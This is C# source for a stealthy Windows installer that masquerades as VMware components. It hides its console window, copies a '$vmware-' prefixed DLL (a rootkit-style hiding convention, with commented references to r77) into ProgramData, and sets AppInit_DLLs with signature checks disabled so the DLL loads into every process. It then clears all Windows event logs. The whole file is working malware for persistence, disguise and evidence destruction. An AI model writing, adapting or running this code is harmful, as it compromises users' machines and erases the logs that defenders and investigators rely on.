using System;
using Microsoft.Win32;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

/// <summary>
///  
/// 
/// 
/// VMware-x64.dll and VMware-94.dll must be in the same current dir.
/// 
/// Changelog:
/// 
/// Key word is:    '$vmware-'  Oct 28, 2019
/// Key word is:    'VMware-'   Oct 22, 2019
/// Key word is:    '@VMware-'  May 11, 2019
/// 
/// 
/// 
/// 
/// </summary>
namespace Install
{
    class Class1
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        private void Install(bool is64bit, bool dynamic)
        {
            // x-<64 or 86>.dll
            string extension = "x" + (is64bit ? 64 : 86) + ".dll";
            // The real DLL files that have been transfared. Example: $vmware-x64.dll
            string sorcPath = "";
            if (dynamic)
            {
                sorcPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "rvmware-" + extension);
            }
            else
            {
                // $vmware-0-x64.dll
                sorcPath = Path.Combine(@"C:\\Program Files (x86)\\Common Files\\", "vmware-0-" + extension);

            }

            // Where the new copied DLL files will be saved. 
            // Do not forget '@VMware-'  :)

            //string destPath = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + extension);
            //File.Copy(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "r77-" + extension), destPath);
            //new FileInfo(destPath).Attributes |= FileAttributes.Temporary;

            // Notice that this is not hidden!!
            string destPath = Path.Combine("C:\\ProgramData\\VMware\\", "$vmware-" + Guid.NewGuid().ToString("N") + "-" + extension);
            File.Copy(sorcPath, destPath);
            new FileInfo(destPath).Attributes |= FileAttributes.Temporary;

            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
            {
                key.SetValue("LoadAppInit_DLLs", 1);
                key.SetValue("RequireSignedAppInit_DLLs", 0);
                key.SetValue("AppInit_DLLs", destPath);
            }
        }

        private void CleanAllEventLogs()
        {
            foreach (var eventLog in EventLog.GetEventLogs())
            {
                eventLog.Clear();
                eventLog.Dispose();
            }
        }


        // If it already exists 
        private bool CheckKey(bool is64bit)
        {
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
            {
                string v = key.GetValue("AppInit_DLLs", true).ToString();
                if (v.Contains("x64"))
                {
                    return true;
                }
                else if (v.Contains("x86"))
                {
                    return true;
                }
                else
                {
                    return false;
                }


            }
        }

        // It only works on x64\
        // NT.exe
        static void Main(string[] args)
        {
            Class1 p = new Class1();
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            if (p.CheckKey(true))
            {
                Environment.Exit(0);
            }


            p.Install(true, false);
            //Console.ReadKey();
            try
            {

                //p.Install(true, true);
                //p.Install(false, true);
                Console.WriteLine("Static Done! :)");
            }
            catch (Exception ex)
            {
                //ShowWindow(handle, SW_SHOW);
                Console.WriteLine("1- Something bad happend! \r\n" + ex.GetType() + ": " + ex.Message + "\r\n");
                try
                {
                    p.Install(true, false);
                    //p.Install(false, false);
                    Console.WriteLine("Dinamic Done! :)");
                }
                catch (Exception ex2)
                {
                    Console.WriteLine("2- Something bad happend! \r\n" + ex2.GetType() + ": " + ex2.Message + "\r\n");
                }
            }
            p.CleanAllEventLogs();
            //Console.ReadKey();
        }
    }
}
